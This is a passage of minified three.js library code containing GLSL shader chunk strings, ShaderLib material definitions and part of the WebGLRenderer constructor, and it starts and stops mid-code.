<clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <envmap_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.meshphysical_frag=\"#define PHYSICAL\\nuniform vec3 diffuse;\\nuniform vec3 emissive;\\nuniform float roughness;\\nuniform float metalness;\\nuniform float opacity;\\n#ifndef STANDARD\\n\\tuniform float clearCoat;\\n\\tuniform float clearCoatRoughness;\\n#endif\\nuniform float envMapIntensity;\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <packing>\\n#include <color_pars_fragment>\\n#include <uv_pars_fragment>\\n#include <uv2_pars_fragment>\\n#include <map_pars_fragment>\\n#include <alphamap_pars_fragment>\\n#include <aomap_pars_fragment>\\n#include <lightmap_pars_fragment>\\n#include <emissivemap_pars_fragment>\\n#include <envmap_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <bsdfs>\\n#include <cube_uv_reflection_fragment>\\n#include <lights_pars>\\n#include <lights_physical_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <bumpmap_pars_fragment>\\n#include <normalmap_pars_fragment>\\n#include <roughnessmap_pars_fragment>\\n#include <metalnessmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\tReflectedLight reflectedLight = ReflectedLight( vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ), vec3( 0.0 ) );\\n\\tvec3 totalEmissiveRadiance = emissive;\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphamap_fragment>\\n\\t#include <alphatest_fragment>\\n\\t#include <specularmap_fragment>\\n\\t#include <roughnessmap_fragment>\\n\\t#include <metalnessmap_fragment>\\n\\t#include <normal_flip>\\n\\t#include <normal_fragment>\\n\\t#include <emissivemap_fragment>\\n\\t#include <lights_physical_fragment>\\n\\t#include <lights_template>\\n\\t#include <aomap_fragment>\\n\\tvec3 outgoingLight = reflectedLight.directDiffuse + reflectedLight.indirectDiffuse + reflectedLight.directSpecular + reflectedLight.indirectSpecular + totalEmissiveRadiance;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.meshphysical_vert=\"#define PHYSICAL\\nvarying vec3 vViewPosition;\\n#ifndef FLAT_SHADED\\n\\tvarying vec3 vNormal;\\n#endif\\n#include <common>\\n#include <uv_pars_vertex>\\n#include <uv2_pars_vertex>\\n#include <displacementmap_pars_vertex>\\n#include <color_pars_vertex>\\n#include <morphtarget_pars_vertex>\\n#include <skinning_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <specularmap_pars_fragment>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <uv_vertex>\\n\\t#include <uv2_vertex>\\n\\t#include <color_vertex>\\n\\t#include <beginnormal_vertex>\\n\\t#include <morphnormal_vertex>\\n\\t#include <skinbase_vertex>\\n\\t#include <skinnormal_vertex>\\n\\t#include <defaultnormal_vertex>\\n#ifndef FLAT_SHADED\\n\\tvNormal = normalize( transformedNormal );\\n#endif\\n\\t#include <begin_vertex>\\n\\t#include <displacementmap_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <skinning_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\tvViewPosition = - mvPosition.xyz;\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.normal_frag=\"uniform float opacity;\\nvarying vec3 vNormal;\\n#include <common>\\n#include <packing>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tgl_FragColor = vec4( packNormalToRGB( vNormal ), opacity );\\n\\t#include <logdepthbuf_fragment>\\n}\\n\";THREE.ShaderChunk.normal_vert=\"varying vec3 vNormal;\\n#include <common>\\n#include <morphtarget_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\tvNormal = normalize( normalMatrix * normal );\\n\\t#include <begin_vertex>\\n\\t#include <morphtarget_vertex>\\n\\t#include <project_vertex>\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n}\\n\";\nTHREE.ShaderChunk.points_frag=\"uniform vec3 diffuse;\\nuniform float opacity;\\n#include <common>\\n#include <color_pars_fragment>\\n#include <map_particle_pars_fragment>\\n#include <fog_pars_fragment>\\n#include <shadowmap_pars_fragment>\\n#include <logdepthbuf_pars_fragment>\\n#include <clipping_planes_pars_fragment>\\nvoid main() {\\n\\t#include <clipping_planes_fragment>\\n\\tvec3 outgoingLight = vec3( 0.0 );\\n\\tvec4 diffuseColor = vec4( diffuse, opacity );\\n\\t#include <logdepthbuf_fragment>\\n\\t#include <map_particle_fragment>\\n\\t#include <color_fragment>\\n\\t#include <alphatest_fragment>\\n\\toutgoingLight = diffuseColor.rgb;\\n\\tgl_FragColor = vec4( outgoingLight, diffuseColor.a );\\n\\t#include <premultiplied_alpha_fragment>\\n\\t#include <tonemapping_fragment>\\n\\t#include <encodings_fragment>\\n\\t#include <fog_fragment>\\n}\\n\";\nTHREE.ShaderChunk.points_vert=\"uniform float size;\\nuniform float scale;\\n#include <common>\\n#include <color_pars_vertex>\\n#include <shadowmap_pars_vertex>\\n#include <logdepthbuf_pars_vertex>\\n#include <clipping_planes_pars_vertex>\\nvoid main() {\\n\\t#include <color_vertex>\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#ifdef USE_SIZEATTENUATION\\n\\t\\tgl_PointSize = size * ( scale / - mvPosition.z );\\n\\t#else\\n\\t\\tgl_PointSize = size;\\n\\t#endif\\n\\t#include <logdepthbuf_vertex>\\n\\t#include <clipping_planes_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderChunk.shadow_frag=\"uniform float opacity;\\n#include <common>\\n#include <packing>\\n#include <bsdfs>\\n#include <lights_pars>\\n#include <shadowmap_pars_fragment>\\n#include <shadowmask_pars_fragment>\\nvoid main() {\\n\\tgl_FragColor = vec4( 0.0, 0.0, 0.0, opacity * ( 1.0  - getShadowMask() ) );\\n}\\n\";THREE.ShaderChunk.shadow_vert=\"#include <shadowmap_pars_vertex>\\nvoid main() {\\n\\t#include <begin_vertex>\\n\\t#include <project_vertex>\\n\\t#include <worldpos_vertex>\\n\\t#include <shadowmap_vertex>\\n}\\n\";\nTHREE.ShaderLib={basic:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.fog]),vertexShader:THREE.ShaderChunk.meshbasic_vert,fragmentShader:THREE.ShaderChunk.meshbasic_frag},lambert:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new THREE.Color(0)}}]),vertexShader:THREE.ShaderChunk.meshlambert_vert,\nfragmentShader:THREE.ShaderChunk.meshlambert_frag},phong:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.bumpmap,THREE.UniformsLib.normalmap,THREE.UniformsLib.displacementmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new THREE.Color(0)},specular:{value:new THREE.Color(1118481)},shininess:{value:30}}]),vertexShader:THREE.ShaderChunk.meshphong_vert,fragmentShader:THREE.ShaderChunk.meshphong_frag},\nstandard:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.aomap,THREE.UniformsLib.lightmap,THREE.UniformsLib.emissivemap,THREE.UniformsLib.bumpmap,THREE.UniformsLib.normalmap,THREE.UniformsLib.displacementmap,THREE.UniformsLib.roughnessmap,THREE.UniformsLib.metalnessmap,THREE.UniformsLib.fog,THREE.UniformsLib.lights,{emissive:{value:new THREE.Color(0)},roughness:{value:.5},metalness:{value:0},envMapIntensity:{value:1}}]),vertexShader:THREE.ShaderChunk.meshphysical_vert,\nfragmentShader:THREE.ShaderChunk.meshphysical_frag},points:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.points,THREE.UniformsLib.fog]),vertexShader:THREE.ShaderChunk.points_vert,fragmentShader:THREE.ShaderChunk.points_frag},dashed:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,THREE.UniformsLib.fog,{scale:{value:1},dashSize:{value:1},totalSize:{value:2}}]),vertexShader:THREE.ShaderChunk.linedashed_vert,fragmentShader:THREE.ShaderChunk.linedashed_frag},depth:{uniforms:THREE.UniformsUtils.merge([THREE.UniformsLib.common,\nTHREE.UniformsLib.displacementmap]),vertexShader:THREE.ShaderChunk.depth_vert,fragmentShader:THREE.ShaderChunk.depth_frag},normal:{uniforms:{opacity:{value:1}},vertexShader:THREE.ShaderChunk.normal_vert,fragmentShader:THREE.ShaderChunk.normal_frag},cube:{uniforms:{tCube:{value:null},tFlip:{value:-1}},vertexShader:THREE.ShaderChunk.cube_vert,fragmentShader:THREE.ShaderChunk.cube_frag},equirect:{uniforms:{tEquirect:{value:null},tFlip:{value:-1}},vertexShader:THREE.ShaderChunk.equirect_vert,fragmentShader:THREE.ShaderChunk.equirect_frag},\ndistanceRGBA:{uniforms:{lightPos:{value:new THREE.Vector3}},vertexShader:THREE.ShaderChunk.distanceRGBA_vert,fragmentShader:THREE.ShaderChunk.distanceRGBA_frag}};THREE.ShaderLib.physical={uniforms:THREE.UniformsUtils.merge([THREE.ShaderLib.standard.uniforms,{clearCoat:{value:0},clearCoatRoughness:{value:0}}]),vertexShader:THREE.ShaderChunk.meshphysical_vert,fragmentShader:THREE.ShaderChunk.meshphysical_frag};\nTHREE.WebGLRenderer=function(a){function b(a,b,c,d){!0===A&&(a*=d,b*=d,c*=d);R.clearColor(a,b,c,d)}function c(){R.init();R.scissor(X.copy(ua).multiplyScalar($));R.viewport(ba.copy(ma).multiplyScalar($));b(V.r,V.g,V.b,Y)}function d(){T=Q=null;aa=\"\";G=-1;R.reset()}function e(a){a.preventDefault();d();c();Z.clear()}function f(a){a=a.target;a.removeEventListener(\"dispose\",f);g(a);Z.delete(a)}function g(a){var b=Z.get(a).program;a.program=void 0;void 0!==b&&na.releaseProgram(b)}function h(a,b){return Math.abs(b[0])-\nMath.abs(a[0])}function k(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.material.id!==b.material.id?a.material.id-b.material.id:a.z!==b.z?a.z-b.z:a.id-b.id}function l(a,b){return a.object.renderOrder!==b.object.renderOrder?a.object.renderOrder-b.object.renderOrder:a.z!==b.z?b.z-a.z:a.id-b.id}function n(a,b,c,d,e){var f;c.transparent?(d=P,f=++M):(d=F,f=++K);f=d[f];void 0!==f?(f.id=a.id,f.object=a,f.geometry=b,f.material=c,f.z=W.z,f.group=e):(f=\n{id:a.id,object:a,geometry:b,material:c,z:W.z,group:e},d.push(f))}function p(a){if(!wa.intersectsSphere(a))return!1;var b=ca.numPlanes;if(0===b)return!0;var c=N.clippingPlanes,d=a.center;a=-a.radius;var e=0;do if(c[e].distanceToPoint(d)<a)return!1;while(++e!==b);return!0}function m(a,b){if(!1!==a.visible){if(a.layers.test(b.layers))if(a instanceof THREE.Light)B.push(a);else if(a instanceof THREE.Sprite){var c;(c=!1===a.frustumCulled)||(ha.center.set(0,0,0),ha.radius=.7071067811865476,ha.applyMatrix4(a.matrixWorld),\nc=!0===p(ha));c&&L.push(a)}else if(a instanceof THREE.LensFlare)O.push(a);else if(a instanceof THREE.ImmediateRenderObject)!0===N.sortObjects&&(W.setFromMatrixPosition(a.matrixWorld),W.applyProjection(pa)),n(a,null,a.material,W.z,null);else if(a instanceof THREE.Mesh||a instanceof THREE.Line||a instanceof THREE.Points)if(a instanceof THREE.SkinnedMesh&&a.skeleton.update(),(c=!1===a.frustumCulled)||(c=a.geometry,null===c.boundingSphere&&c.computeBoundingSphere(),ha.copy(c.boundingSphere).applyMatrix4(a.matrixWorld),\nc=!0===p(ha)),c){var d=a.material;if(!0===d.visible)if(!0===N.sortObjects&&(W.setFromMatrixPosition(a.matrixWorld),W.applyProjection(pa)),c=ea.update(a),d instanceof THREE.MultiMaterial)for(var e=c.groups,f=d.materials,d=0,g=e.length;d<g;d++){var h=e[d],k=f[h.materialIndex];!0===k.visible&&n(a,c,k,W.z,h)}else n(a,c,d,W.z,null)}c=a.children;d=0;for(g=c.length;d<g;d++)m(c[d],b)}}function q(a,b,c,d){for(var e=0,f=a.length;e<f;e++){var g=a[e],h=g.object,k=g.geometry,m=void 0===d?g.material:d,g=g.group;\nh.modelViewMatrix.multiplyMatrices(b.matrixWorldInverse,h.matrixWorld);h.normalMatrix.getNormalMatrix(h.modelViewMatrix);if(h instanceof THREE.ImmediateRenderObject){r(m);var l=s(b,c,m,h);aa=\"\";h.render(function(a){N.renderBufferImmediate(a,l,m)})}else N.renderBufferDirect(b,c,k,m,h,g)}}function r(a){a.side!==THREE.DoubleSide?R.enable(x.CULL_FACE):R.disable(x.CULL_FACE);R.setFlipSided(a.side===THREE.BackSide);!0===a.transparent?R.setBlending(a.blending,a.blendEquation,a.blendSrc,a.blendDst,a.blendEquationAlpha,\na.blendSrcAlpha,a.blendDstAlpha,a.premultipliedAlpha):R.setBlending(THREE.NoBlending);R.setDepthFunc(a.depthFunc);R.setDepthTest(a.depthTest);R.setDepthWrite(a.depthWrite);R.setColorWrite(a.colorWrite);R.setPolygonOffset(a.polygonOffset,a.polygonOffsetFactor,a.polygonOffsetUnits)}function s(a,b,c,d){ia=0;var e=Z.get(c);qa&&((va||a!==T)&&ca.setState(c.clippingPlanes,c.clipShadows,a,e,a===T&&c.id===G),void 0!==e.numClippingPlanes&&e.numClippingPlanes!==ca.numPlanes&&(c.needsUpdate=!0));void 0===e.program&&\n(c.needsUpdate=!0);void 0!==e.lightsHash&&e.lightsHash!==S.hash&&(c.needsUpdate=!0);if(c.needsUpdate){a:{var h=Z.get(c),k=na.getParameters(c,S,b,ca.numPlanes,d),m=na.getProgramCode(c,k),l=h.program,p=!0;if(void 0===l)c.addEventListener(\"dispose\",f);else if(l.code!==m)g(c);else if(void 0!==k.shaderID)break a;else p=!1;p&&(k.shaderID?(l=THREE.ShaderLib[k.shaderID],h.__webglShader={name:c.type,uniforms:THREE.UniformsUtils.clone(l.uniforms),vertexShader:l.vertexShader,fragmentShader:l.fragmentShader}):\nh.__webglShader={name:c.type,uniforms:c.uniforms,vertexShader:c.vertexShader,fragmentShader:c.fragmentShader},c.__webglShader=h.__webglShader,l=na.acquireProgram(c,k,m),h.program=l,c.program=l);k=l.getAttributes();if(c.morphTargets)for(m=c.numSupportedMorphTargets=0;m<N.maxMorphTargets;m++)0<=k[\"morphTarget\"+m]&&c.numSupportedMorphTargets++;if(c.morphNormals)for(m=c.numSupportedMorphNormals=0;m<N.maxMorphNormals;m++)0<=k[\"morphNormal\"+m]&&c.numSupportedMorphNormals++;k=h.__webglShader.uniforms;(c instanceof\nTHREE.ShaderMaterial||c instanceof THREE.RawShaderMaterial)&&!0!==c.clipping||(h.numClippingPlanes=ca.numPlanes,k.clippingPlanes=ca.uniform);c.lights&&(h.lightsHash=S.hash,k.ambientLightColor.value=S.ambient,k.directionalLights.value=S.directional,k.spotLights.value=S.spot,k.pointLights.value=S.point,k.hemisphereLights.value=S.hemi,k.directionalShadowMap.value=S.directionalShadowMap,k.directionalShadowMatrix.value=S.directionalShadowMatrix,k.spotShadowMap.value=S.spotShadowMap,k.spotShadowMatrix.value=\nS.spotShadowMatrix,k.pointShadowMap.value=S.pointShadowMap,k.pointShadowMatrix.value=S.pointShadowMatrix);m=h.program.getUniforms();m=THREE.WebGLUniforms.seqWithValue(m.seq,k);h.uniformsList=m;h.dynamicUniforms=THREE.WebGLUniforms.splitDynamic(m,k)}c.needsUpdate=!1}var n=!1,p=l=!1,h=e.program,m=h.getUniforms(),k=e.__webglShader.uniforms;h.id!==Q&&(x.useProgram(h.program),Q=h.id,p=l=n=!0);c.id!==G&&(G=c.id,l=!0);if(n||a!==T){m.set(x,a,\"projectionMatrix\");da.logarithmicDepthBuffer&&m.setValue(x,\"logDepthBufFC\",\n2/(Math.log(a.far+1)/Math.LN2));a!==T&&(T=a,p=l=!0);if(c instanceof THREE.ShaderMaterial||c instanceof THREE.MeshPhongMaterial||c instanceof THREE.MeshStandardMaterial||c.envMap)n=m.map.cameraPosition,void 0!==n&&n.setValue(x,W.setFromMatrixPosition(a.matrixWorld));(c instanceof THREE.MeshPhongMaterial||c instanceof THREE.MeshLambertMaterial||c instanceof THREE.MeshBasicMaterial||c instanceof THREE.MeshStandardMaterial||c instanceof THREE.ShaderMaterial||c.skinning)&&m.setValue(x,\"viewMatrix\",a.matrixWorldInverse);\nm.set(x,N,\"toneMappingExposure\");m.set(x,N,\"toneMappingWhitePoint\")}c.skinning&&(m.setOptional(x,d,\"bindMatrix\"),m.setOptional(x,d,\"bindMatrixInverse\"),n=d.skeleton)&&(da.floatVertexTextures&&n.useVertexTexture?(m.set(x,n,\"boneTexture\"),m.set(x,n,\"boneTextureWidth\"),m.set(x,n,\"boneTextureHeight\")):m.setOptional(x,n,\"boneMatrices\"));if(l){c.lights&&(l=p,k.ambientLightColor.needsUpdate=l,k.directionalLights.needsUpdate=l,k.pointLights.needsUpdate=l,k.spotLights.needsUpdate=l,k.hemisphereLights.needsUpdate=\nl);b&&c.fog&&(k.fogColor.value=b.color,b instanceof THREE.Fog?(k.fogNear.value=b.near,k.fogFar.value=b.far):b instanceof THREE.FogExp2&&(k.fogDensity.value=b.density));if(c instanceof THREE.MeshBasicMaterial||c instanceof THREE.MeshLambertMaterial||c instanceof THREE.MeshPhongMaterial||c instanceof THREE.MeshStandardMaterial||c instanceof THREE.MeshDepthMaterial){k.opacity.value=c.opacity;k.diffuse.value=c.color;c.emissive&&k.emissive.value.copy(c.emissive).multiplyScalar(c.emissiveIntensity);k.map.value=\nc.map;k.specularMap.value=c.specularMap;k.alphaMap.value=c.alphaMap;c.aoMap&&(k.aoMap.value=c.aoMap,k.aoMapIntensity.value=c.aoMapIntensity);var q;c.map?q=c.map:c.specularMap?q=c.specularMap:c.displacementMap?q=c.displacementMap:c.normalMap?q=c.normalMap:c.bumpMap?q=c.bumpMap:c.roughnessMap?q=c.roughnessMap:c.metalnessMap?q=c.metalnessMap:c.alphaMap?q=c.alphaMap:c.emissiveMap&&(q=c.emissiveMap);void 0!==q&&(q instanceof THREE.WebGLRenderTarget&&(q=q.texture),b=q.offset,q=q.repeat,k.offsetRepeat.value.set(b.x,\nb.y,q.x,q.y));k.envMap.value=c.envMap;k.flipEnvMap.value=c.envMap instanceof THREE.CubeTexture?-1:1;k.reflectivity.value=c.reflectivity;k.refractionRatio.value=c.refractionRatio}c instanceof THREE.LineBasicMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity):c instanceof THREE.LineDashedMaterial?(k.diffuse.value=c.color,k.opacity.value=c.opacity,k.dashSize.value=c.dashSize,k.totalSize.value=c.dashSize+c.gapSize,k.scale.value=c.scale):c instanceof THREE.PointsMaterial?(k.diffuse.value=c.color,\nk.opacity.value=c.opacity,k.size.value=c.size*$,k.scale.value=.5*v.clientHeight,k.map.value=c.map,null!==c.map&&(q=c.map.offset,c=c.map.repeat,k.offsetRepeat.value.set(q.x,q.y,c.x,c.y))):c instanceof THREE.MeshLambertMaterial?(c.lightMap&&(k.lightMap.value=c.lightMap,k.lightMapIntensity.value=c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap)):c instanceof THREE.MeshPhongMaterial?(k.specular.value=c.specular,k.shininess.value=Math.max(c.shininess,1E-4),c.lightMap&&(k.lightMap.value=\nc.lightMap,k.lightMapIntensity.value=c.lightMapIntensity),c.emissiveMap&&(k.emissiveMap.value=c.emissiveMap),c.bumpMap&&(k.bumpMap.value=c.bumpMap,k.bumpScale.value=c.bumpScale),c.normalMap&&(k.normalMap.value=c.normalMap,k.normalScale.value.copy(c.normalScale)),c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias)):c instanceof THREE.MeshPhysicalMaterial?(k.clearCoat.value=c.clearCoat,k.clearCoatRoughness.value=\nc.clearCoatRoughness,t(k,c)):c instanceof THREE.MeshStandardMaterial?t(k,c):c instanceof THREE.MeshDepthMaterial?c.displacementMap&&(k.displacementMap.value=c.displacementMap,k.displacementScale.value=c.displacementScale,k.displacementBias.value=c.displacementBias):c instanceof THREE.MeshNormalMaterial&&(k.opacity.value=c.opacity);THREE.WebGLUniforms.upload(x,e.uniformsList,k,N)}m.set(x,d,\"modelViewMatrix\");m.set(x,d,\"normalMatrix\");m.setValue(x,\"modelMatrix\",d.matrixWorld);e=e.dynamicUniforms;null!==\ne&&(THREE.WebGLUniforms.evalDynamic(e,k,d,a),THREE.WebGLUniforms.upload(x,e,k,N));return h}function t(a,b){a.roughness.value=b.roughness;a.metalness.value=b.metalness;b.roughnessMap&&(a.roughnessMap.value=b.roughnessMap);b.metalnessMap&&(a.metalnessMap.value=b.metalnessMap);b.lightMap&&(a.lightMap.value=b.lightMap,a.lightMapIntensity.value=b.lightMapIntensity);b.emissiveMap&&(a.emissiveMap.value=b.emissiveMap);b.bumpMap&&(a.bumpMap.value=b.bumpMap,a.bumpScale.value=b.bumpScale);b.normalMap&&(a.normalMap.value=\nb.normalMap,a.normalScale.value.copy(b.normalScale));b.displacementMap&&(a.displacementMap.value=b.displacementMap,a.displacementScale.value=b.displacementScale,a.displacementBias.value=b.displacementBias);b.envMap&&(a.envMapIntensity.value=b.envMapIntensity)}function u(a){var b;if(a===THREE.RepeatWrapping)return x.REPEAT;if(a===THREE.ClampToEdgeWrapping)return x.CLAMP_TO_EDGE;if(a===THREE.MirroredRepeatWrapping)return x.MIRRORED_REPEAT;if(a===THREE.NearestFilter)return x.NEAREST;if(a===THREE.NearestMipMapNearestFilter)return x.NEAREST_MIPMAP_NEAREST;\nif(a===THREE.NearestMipMapLinearFilter)return x.NEAREST_MIPMAP_LINEAR;if(a===THREE.LinearFilter)return x.LINEAR;if(a===THREE.LinearMipMapNearestFilter)return x.LINEAR_MIPMAP_NEAREST;if(a===THREE.LinearMipMapLinearFilter)return x.LINEAR_MIPMAP_LINEAR;if(a===THREE.UnsignedByteType)return x.UNSIGNED_BYTE;if(a===THREE.UnsignedShort4444Type)return x.UNSIGNED_SHORT_4_4_4_4;if(a===THREE.UnsignedShort5551Type)return x.UNSIGNED_SHORT_5_5_5_1;if(a===THREE.UnsignedShort565Type)return x.UNSIGNED_SHORT_5_6_5;\nif(a===THREE.ByteType)return x.BYTE;if(a===THREE.ShortType)return x.SHORT;if(a===THREE.UnsignedShortType)return x.UNSIGNED_SHORT;if(a===THREE.IntType)return x.INT;if(a===THREE.UnsignedIntType)return x.UNSIGNED_INT;if(a===THREE.FloatType)return x.FLOAT;b=U.get(\"OES_texture_half_float\");if(null!==b&&a===THREE.HalfFloatType)return b.HALF_FLOAT_OES;if(a===THREE.AlphaFormat)return x.ALPHA;if(a===THREE.RGBFormat)return x.RGB;if(a===THREE.RGBAFormat)return x.RGBA;if(a===THREE.LuminanceFormat)return x.LUMINANCE;\nif(a===THREE.LuminanceAlphaFormat)return x.LUMINANCE_ALPHA;if(a===THREE.DepthFormat)return x.DEPTH_COMPONENT;if(a===THREE.AddEquation)return x.FUNC_ADD;if(a===THREE.SubtractEquation)return x.FUNC_SUBTRACT;if(a===THREE.ReverseSubtractEquation)return x.FUNC_REVERSE_SUBTRACT;if(a===THREE.ZeroFactor)return x.ZERO;if(a===THREE.OneFactor)return x.ONE;if(a===THREE.SrcColorFactor)return x.SRC_COLOR;if(a===THREE.OneMinusSrcColorFactor)return x.ONE_MINUS_SRC_COLOR;if(a===THREE.SrcAlphaFactor)return x.SRC_ALPHA;\nif(a===THREE.OneMinusSrcAlphaFactor)return x.ONE_MINUS_SRC_ALPHA;if(a===THREE.DstAlphaFactor)return x.DST_ALPHA;if(a===THREE.OneMinusDstAlphaFactor)return x.ONE_MINUS_DST_ALPHA;if(a===THREE.DstColorFactor)return x.DST_COLOR;if(a===THREE.OneMinusDstColorFactor)return x.ONE_MINUS_DST_COLOR;if(a===THREE.SrcAlphaSaturateFactor)return x.SRC_ALPHA_SATURATE;b=U.get(\"WEBGL_compressed_texture_s3tc\");if(null!==b){if(a===THREE.RGB_S3TC_DXT1_Format)return b.COMPRESSED_RGB_S3TC_DXT1_EXT;if(a===THREE.RGBA_S3TC_DXT1_Format)return b.COMPRESSED_RGBA_S3TC_DXT1_EXT;\nif(a===THREE.RGBA_S3TC_DXT3_Format)return b.COMPRESSED_RGBA_S3TC_DXT3_EXT;if(a===THREE.RGBA_S3TC_DXT5_Format)return b.COMPRESSED_RGBA_S3TC_DXT5_EXT}b=U.get(\"WEBGL_compressed_texture_pvrtc\");if(null!==b){if(a===THREE.RGB_PVRTC_4BPPV1_Format)return b.COMPRESSED_RGB_PVRTC_4BPPV1_IMG;if(a===THREE.RGB_PVRTC_2BPPV1_Format)return b.COMPRESSED_RGB_PVRTC_2BPPV1_IMG;if(a===THREE.RGBA_PVRTC_4BPPV1_Format)return b.COMPRESSED_RGBA_PVRTC_4BPPV1_IMG;if(a===THREE.RGBA_PVRTC_2BPPV1_Format)return b.COMPRESSED_RGBA_PVRTC_2BPPV1_IMG}b=\nU.get(\"WEBGL_compressed_texture_etc1\");if(null!==b&&a===THREE.RGB_ETC1_Format)return b.COMPRESSED_RGB_ETC1_WEBGL;b=U.get(\"EXT_blend_minmax\");if(null!==b){if(a===THREE.MinEquation)return b.MIN_EXT;if(a===THREE.MaxEquation)return b.MAX_EXT}return 0}console.log(\"THREE.WebGLRenderer\",THREE.REVISION);a=a||{};var v=void 0!==a.canvas?a.canvas:document.createElementNS(\"http://www.w3.org/1999/xhtml\",\"canvas\"),C=void 0!==a.context?a.context:null,w=void 0!==a.alpha?a.alpha:!1,E=void 0!==a.depth?a.depth:!0,z=\nvoid 0!==a.stencil?a.stencil:!0,y=void 0!==a.antialias?a.antialias:!1,A=void 0!==a.premultipliedAlpha?a.premultipliedAlpha:!0,I=void 0!==a.preserveDrawingBuffer?a.preserveDrawingBuffer:!1,B=[],F=[],K=-1,P=[],M=-1,H=new Float32Array(8),L=[],O=[];this.domElement=v;this.context=null;this.sortObjects=this.autoClearStencil=this.autoClearDepth=this.autoClearColor=this.autoClear=!0;this.clippingPlanes=[];this.localClippingEnabled=!1;this.gammaFactor=2;this.physicallyCorrectLights=this.gammaOutput=this.gammaInput=\n!1;this.toneMapping=THREE.LinearToneMapping;this.toneMappingWhitePoint=this.toneMappingExposure=1;this.maxMorphTargets=8;this.maxMorphNormals=4;var N=this,Q=null,J=null,D=null,G=-1,aa=\"\",T=null,X=new THREE.Vector4,ja=null,ba=new THREE.Vector4,ia=0,V=new THREE.Color(0),Y=0,ra=v.width,sa=v.height,$=1,ua=new THREE.Vector4(0,0,ra,sa),xa=!1,ma=new THREE.Vector4(0,0,ra,sa),wa=new THREE.Frustum,ca=new THREE.WebGLClipping,qa=!1,va=!1,ha=new THREE.Sphere,pa=new THREE.Matrix4,W=new THREE.Vector3,S={hash:\"\",\nambient:[0,0,0],directional:[],directionalShadowMap:[],directionalShadowMatrix:[],spot:[],spotShadowMap:[],spotShadowMatrix:[],point:[],pointShadowMap:[],pointShadowMatrix:[],hemi:[],shadows:[]},fa={calls:0,vertices:0,faces:0,points:0};this.info={render:fa,memory:{geometries:0,textures:0},programs:null};var x;try{w={alpha:w,depth:E,stencil:z,antialias:y,premultipliedAlpha:A,preserveDrawingBuffer:I};x=C||v.getContext(\"webgl\",w)||v.getContext(\"experimental-webgl\",w);if(null===x){if(null!==v.getContext(\"webgl\"))throw\"Error creating WebGL context with your selected attributes.\";\nthrow\"Error creating WebGL context.\";}void 0===x.getShaderPrecisionFormat&&(x.getShaderPrecisionFormat=function(){return{rangeMin:1,rangeMax:1,precision:1}});v.addEventListener(\"webglcontextlost\",e,!1)}catch(za){console.error(\"THREE.WebGLRenderer: \"+za)}var U=new THREE.WebGLExtensions(x);U.get(\"WEBGL_depth_texture\");U.get(\"OES_texture_float\");U.get(\"OES_texture_float_linear\");U.get(\"OES_texture_half_float\");U.get(\"OES_texture_half_float_linear\");U.get(\"OES_standard_derivatives\");U.get(\"ANGLE_instanced_arrays\");\nU.get(\"OES_element_index_uint\")&&(THREE.BufferGeometry.MaxIndex=4294967296);var da=new THREE.WebGLCapabilities(x,U,a),R=new THREE.WebGLState(x,U,u),Z=new THREE.WebGLProperties,ka=new THREE.WebGLTextures(x,U,R,Z,da,u,this.info),ea=new THREE.WebGLObjects(x,Z,this.info),na=new THREE.WebGLPrograms(this,da),ta=new THREE.WebGLLights;this.info.programs=na.programs;var Aa=new THREE.WebGLBufferRenderer(x,U,fa),Ba=new THREE.WebGLIndexedBufferRenderer(x,U,fa),Ca=new 